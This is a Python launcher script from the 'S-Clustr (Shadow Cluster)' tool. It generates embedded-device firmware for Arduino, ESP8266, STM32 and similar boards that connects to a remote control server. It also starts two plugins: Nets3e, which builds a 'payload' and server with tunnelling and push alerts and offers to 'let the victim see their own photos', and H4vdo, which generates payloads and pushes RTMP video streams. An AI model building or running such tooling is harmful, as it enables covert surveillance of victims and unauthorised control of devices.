#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝


from subprocess import run
from datetime import datetime
from sys import argv,path as spath
spath.append('.')
from json import load
from base64 import b64encode
from Component.DingTalkPush import DingTalk

configs = load(open('./Config/Version.conf'))[argv[0].split('.')[0]]
version = f"@Мартин. S-Clustr(Shadow Cluster) Generate embedded device code {configs['version']}"

title = f'''
************************************************************************************
自动生成嵌入式设备的代码
Automatically generate code for embedded devices
************************************************************************************
{configs['describe']}
'''




logo = f'''
███████╗       ██████╗██╗     ██╗   ██╗███████╗████████╗██████╗
██╔════╝      ██╔════╝██║     ██║   ██║██╔════╝╚══██╔══╝██╔══██╗
███████╗█████╗██║     ██║     ██║   ██║███████╗   ██║   ██████╔╝
╚════██║╚════╝██║     ██║     ██║   ██║╚════██║   ██║   ██╔══██╗
███████║      ╚██████╗███████╗╚██████╔╝███████║   ██║   ██║  ██║
╚══════╝       ╚═════╝╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝
                Github==>https://github.com/MartinxMax
                {version}
*********************************************************************
1.Arduino 2.ESP8266 3.AIR780E 4.AT89C51 5.STM32 6.Nets3e 7.H4vdo
'''

class Main():
    def __init__(self):
        self._CONFIG = load(open('./Config/Client.conf'))
        self.__DEVICE = {1: "Arduino", 2: "ESP8266",3:"AIR780E",4:"C51",5:"STM32",6:"Nets3e",7:"H4vdo"}
        types = self.__get_device_type()
        server_run = self._CONFIG[self.__DEVICE[types]].get('RUN')
        server_runback = self._CONFIG[self.__DEVICE[types]].get('DEV_RUN_RECV')
        server_stop = self._CONFIG[self.__DEVICE[types]].get('STOP')
        server_stopback = self._CONFIG[self.__DEVICE[types]].get('DEV_STOP_RECV')
        if not all([server_run, server_runback, server_stop, server_stopback]):
            raise ValueError(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Missing configuration values for {self.__DEVICE[types]} server.")
        if types != 6 and types != 7:
            server = self.__get_server_address()
        if types == 1:
            choice = int(input("1.SIM900A 2.ENC28J60 > "))
            if choice == 1:
                self.__arduino('SIM900A',server[0], server[1], server_run, server_runback, server_stop, server_stopback)
            elif choice == 2:
                self.__arduino('ENC28J60',server[0], server[1], server_run, server_runback, server_stop, server_stopback)
            else:
                print("[!] Exit...")
        elif types == 2:
            ssid,password = self.__ssid_password()
            if ssid and password:
                self.__esp8266(server[0], server[1], server_run, server_runback, server_stop, server_stopback,ssid,password)
            else:
                print("[!] Exit...")
        elif types == 3:
            self.__air780e(server[0], server[1], server_run, server_runback, server_stop, server_stopback)
        elif types == 4:
            self.__c51(server[0], server[1], server_run, server_runback, server_stop, server_stopback)
        elif types == 5:
            self.__stm32(server[0], server[1], server_run, server_runback, server_stop, server_stopback)
        elif types == 6:
            self.__nets3e()
        elif types == 7:
            self.__h4vdo()
        print("[*] DONE")

    def __get_device_type(self):
        while True:
            try:
                types = int(input("[Device Type (Number)]>"))
                if types in self.__DEVICE:
                    return types
                else:
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Invalid device type. Please enter a number between 1 and 3.")
            except ValueError:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Invalid input. Please enter a number.")

    def __get_server_address(self):
        while True:
            server = input("[S-Clustr Server IP Address](xxx.xxx.xxx.xxx:10000)> ").split(':')
            if len(server) == 2 and server[1].isdigit():
                return server
            else:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Invalid input. Please enter the server IP address and port number in the format xxx.xxx.xxx.xxx:10000.")


    def __generate(self, types, ext,data):
        try:
            with open(f'./Device/Output/{types}.{ext}', 'w', encoding='utf-8') as f:
                f.write(data)
        except FileNotFoundError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Error: File not found: {types}.{ext}")
        except PermissionError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Error: Permission denied to write to file: {types}.{ext}")
        except UnicodeEncodeError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}]Error: Failed to encode data to utf-8")
        else:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] File [./Device/Output/{types}.{ext}] generated successfully")

    def __read_file(self,types,ext):
        data = ''
        try:
            with open(f'./Device/Source/{types}.{ext}', 'r', encoding='utf-8') as f:
                data = f.read()
        except FileNotFoundError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Error: File not found: {types}.{ext}")
        except PermissionError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] Error: Permission denied to write to file: {types}.{ext}")
        except UnicodeEncodeError:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}]Error: Failed to encode data to utf-8")
        else:
            return data


    def __arduino(self,type,ip,port,run,runback,stop,stopback):
        __arduino = self.__read_file('Arduino'+f'_{type}','source')
        data = __arduino.replace('@SERVER_IP',ip)
        data = data.replace('@SERVER_PORT',port)
        data = data.replace('@SERVER_RUN',run)
        data = data.replace('@RESPON_RUN',runback)
        data = data.replace('@SERVER_STOP',stop)
        data = data.replace('@RESPON_STOP',stopback)
        self.__generate('arduino/Arduino'+f'_{type}','ino',data)



    def __esp8266(self,ip,port,run,runback,stop,stopback,ssid,password):
        esp8266 = self.__read_file('ESP8266','source')
        data = esp8266.replace('@SERVER_IP',ip)
        data = data.replace('@SERVER_PORT',port)
        data = data.replace('@SERVER_RUN',run)
        data = data.replace('@RESPON_RUN',runback)
        data = data.replace('@SERVER_STOP',stop)
        data = data.replace('@RESPON_STOP',stopback)
        data = data.replace('@SSID',ssid)
        data = data.replace('@PASSWORD',password)
        self.__generate('esp8266/ESP8266','ino',data)


    def __ssid_password(self):
        ssid = input("[Wifi][SSID] > ")
        password = input("[Wifi][Password] > ")
        if len(ssid) >= 1 and len(password) >= 8:
            return ssid, password
        else:
            print("[!] Invalid input. SSID must be at least 1 character long and password must be at least 8 characters long.")
            return False,False


    def __air780e(self,ip,port,run,runback,stop,stopback):
        __air780e = self.__read_file('AIR780E','source')
        data = __air780e.replace('@SERVER_IP',ip)
        data = data.replace('@SERVER_PORT',port)
        data = data.replace('@SERVER_RUN',run)
        data = data.replace('@RESPON_RUN',runback)
        data = data.replace('@SERVER_STOP',stop)
        data = data.replace('@RESPON_STOP',stopback)
        self.__generate('AIR780E/main','lua',data)


    def __c51(self,ip,port,run,runback,stop,stopback):
        __c51 = self.__read_file('C51','source')
        data = __c51.replace('@SERVER_IP',ip)
        data = data.replace('@SERVER_PORT',port)
        data = data.replace('@SERVER_RUN',run)
        data = data.replace('@RESPON_RUN',runback)
        data = data.replace('@SERVER_STOP',stop)
        data = data.replace('@RESPON_STOP',stopback)
        self.__generate('C51/main','c',data)


    def __stm32(self,ip,port,run,runback,stop,stopback):
        __stm32 = self.__read_file('stm32','source')
        data = __stm32.replace('@SERVER_IP',ip)
        data = data.replace('@SERVER_PORT',port)
        data = data.replace('@SERVER_RUN',run)
        data = data.replace('@RESPON_RUN',runback)
        data = data.replace('@SERVER_STOP',stop)
        data = data.replace('@RESPON_STOP',stopback)
        self.__generate('STM32/main','c',data)


    def __h4vdo(self):
        def runserver(args):
            try:
                run(args)
            except Exception as e:
                return False
            else:
                return True
        server = int(input("[+] [0] Start RTMP server [1] Skip > "))+1
        if server == 1:
            print("[+] RTMP Server Running....")
            runserver('./Plugin/H4vdo/rtsp-simple-server.exe ./Plugin/H4vdo/rtsp-simple-server.yml')
            print("[+] Done.")
        else:
            ip = input("[+] RTMP server IP > ")
            port = input("[+] RTMP server PORT > ") or '1935'
            key = input("[+] Play key > ")
            version = True if int(input("[+] What is the version of python you want to execute?([0]python [1]python3) >"))==0 else False
            payload = ["python" if version else "python3", "./Plugin/H4vdo/H4vdo.py"]
            option = int(input("[+] [0] Generate payload [1] Push RTMP stream > "))+1
            payload.extend(['-rh',ip])
            payload.extend(['-rp',port])
            payload.extend(['-path',key])
            if 1<= option <= 2:
                if option == 1:
                    try:
                        run('rmdir /s /q "./Device/Output/H4vdo/H4vdo_debug"', shell=True, check=True)
                    except Exception as e:
                        print("[-] Please manually delete (./Device/Output/H4vdo/H4vdo_debug).")
                    else:
                        print("[+] Data refreshed. ")
                elif option == 2:
                    payload.extend(['-push'])
                runserver(payload)
            else:
                print("[!] None")


    def __nets3e(self):
        def runserver(args):
            try:
                run(args)
            except Exception as e:
                print(e)
                return False
            else:
                return True
        s_ip =  input("[+] Nets3e Server IP >")
        s_port = input("[+] Nets3e Server Port >")
        s_salt = input("[+] Nets3e Salt(password) >")
        r_ip = input("[+] Frp or Ngrok Server IP(default blank) >")
        r_port = input("[+] Frp or Ngrok Server Port(default blank)>")
        s_ding = True if input("[+] Enable DingTalk Push?[./Plugin/Nets3e/DingTalk.conf](y/n) >").lower() == 'y'else False
        s_echo = True if input("[+] Let the victim see their own photos?(y/n) >").lower() == 'y' else False
        version = True if int(input("[+] What is the version of python you want to execute?([0]python [1]python3) >"))==0 else False
        choice = int(input("[+] What you need to do?([0]only generate payload [1]only start server [2]generate and start server [3]exit)"))
        payload = ["python" if version else "python3", "./Plugin/Nets3e/Nets3e.py"]
        if s_ip:payload.extend(['-lh',s_ip])
        if s_port:payload.extend(['-lp',s_port])
        if s_salt:payload.extend(['-salt',s_salt])
        if r_ip and r_port:payload.extend(['-rh',"http://"+r_ip+":"+r_port])
        if s_ding:payload.extend(['-dd'])
        if s_echo:payload.extend(['-echo'])
        g_res = 1
        s_res = 1
        if isinstance(choice,int):
            if choice == 0 or choice == 2:
                payload.extend(['-g'])
                g_res = runserver(payload)
            if choice == 1 or choice == 2:
                if '-g' in payload:
                    payload.remove('-g')
                s_res = runserver(payload)

            if not g_res or not s_res:
                print("[!] There is a problem with the python interpreter or the parameters are incorrect!")
        print("[-] Exit")


if __name__ == '__main__':
    print(logo,title)
    Main()
